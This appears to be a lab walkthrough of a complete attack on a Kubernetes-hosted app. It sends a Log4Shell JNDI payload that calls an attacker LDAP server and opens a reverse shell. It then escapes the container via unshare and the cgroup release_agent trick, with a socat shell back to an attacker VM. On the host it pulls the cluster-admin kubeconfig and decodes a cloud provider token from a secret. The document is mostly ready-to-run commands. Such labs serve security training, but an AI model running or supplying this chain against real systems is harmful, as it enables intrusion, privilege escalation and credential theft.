# Run attack

Now let's start the attack. The following HTTP request triggers a log4shell vulnerability because the app logs the user agent.

Because of that log4j will connect to the attacker's LDAP server, which will provide a Java class that gets executed by the sample app and create a remote shell from the container to the attacker's netcat session:

## Run the following commands on the victim VM

```
curl http://sample-app.default.${PUBLIC_IP}.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://${ATTACKER_PUBLIC_IP}:1389/a}'
```

The first shell on the **attacker VM** now received a remote shell from the container.

## Run the following commands on the first attacker terminal.

We can list the container filesystem

```ls -la```

or the running processes

```ps auxf```

Let's try to install kubectl into the container

```
curl -LO --insecure "https://dl.k8s.io/release/$(curl -L -s --insecure https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod +x kubectl; mv kubectl /usr/bin/
```

And access the Kubernetes API. This should create an error, because the Pod's ServiceAccount does not have any permissions to access the Kubernetes API:

```kubectl get pods```

Let's try something else and list the Linux capabilities of the container

```capsh --print```

Not that our container does not have `cap_sys_admin` capabilities.

Let's try to change this by exploiting a Kernel vulnerability:

```
unshare -UrmC bash
capsh --print
```

Now that we have `cap_sys_admin` capabilities. We can try to exploit another Kernel bug to break out of the container and create a second remote shell from the host system to the second terminal on the **attacker VM**.

Create a new RDMA cgroup

```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

Enables cgroup notifications on release of the "x" cgroup

```
echo 1 > /tmp/cgrp/x/notify_on_release
```

Get the path of the OverlayFS mount for our container

```
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
```

Set the release agent to execute `/{overlay_fs_host_path}/cmd` on the host (`/cmd` inside of the container) when the cgroup is released

```
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

Create the command, which will run socat and create a remote shell to the second shell on the **attacker VM**

```
echo '#!/bin/bash' > /cmd
echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${vminfo:attacker02:public_ip}:4444" >> /cmd
chmod a+x /cmd
```

Run `echo` in the cgroup, which will directly exit and trigger the release agent cmd (execute `/{overlay_fs_host_path}/cmd`):

```
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Now we got a remote shell to the **second attacker shell**  where we are root directly on the **victim host**

**Run the following commands on the attacker02 VM.**

```
whoami
docker ps
```

Install kubectl

```docker cp kubelet:/usr/local/bin/kubectl /usr/bin/```

Get kubeconfig

```
kubectl --kubeconfig $(docker inspect kubelet --format '{{ range .Mounts }}{{ if eq .Destination "/etc/kubernetes" }}{{ .Source }}{{ end }}{{ end }}')/ssl/kubecfg-kube-node.yaml get configmap -n kube-system full-cluster-state -o json | jq -r .data.\"full-cluster-state\" | jq -r .currentState.certificatesBundle.\"kube-admin\".config | sed -e "/^[[:space:]]*server:/ s_:.*_: \"https://127.0.0.1:6443\"_" > kubeconfig_admin.yaml

export KUBECONFIG=$(pwd)/kubeconfig_admin.yaml
```

Now we are admin in the Kubernetes cluster

```kubectl get pods -A```

Get the cloud provider token

```
do_token=$(kubectl get secret -n kube-system digitalocean -o jsonpath="{.data.access-token}" | base64 --decode)
```

Install doctl

```
cd ~
wget https://github.com/digitalocean/doctl/releases/download/v1.94.0/doctl-1.94.0-linux-amd64.tar.gz
tar xf ~/doctl-1.94.0-linux-amd64.tar.gz
mv ~/doctl /usr/bin
```

Try to log in with the fake token (this will fail):

```doctl auth init -t $do_token```
